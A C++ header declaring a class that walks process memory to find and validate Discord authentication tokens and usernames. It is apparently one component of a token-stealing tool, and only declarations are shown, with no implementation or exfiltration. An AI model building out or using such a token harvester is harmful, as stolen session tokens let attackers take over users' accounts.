// discord.hpp
#pragma once

namespace core {

	class discord_c
	{
	public:
		[[nodiscard]] std::vector<std::string> find_tokens( );
		[[nodiscard]] std::vector<std::string> find_usernames( );

	private:
		template<typename t>
		void walk_memory( t callback );

		void scan_for_tokens( const char* data, const std::size_t size, std::vector<std::string>* results ) const;
		void scan_for_usernames( const char* data, const std::size_t size, std::vector<std::string>* results ) const;

	private:
		[[nodiscard]] static bool is_token_char( const char character );
		[[nodiscard]] static bool validate_token( const char* data, const std::size_t length );
	};

} // namespace core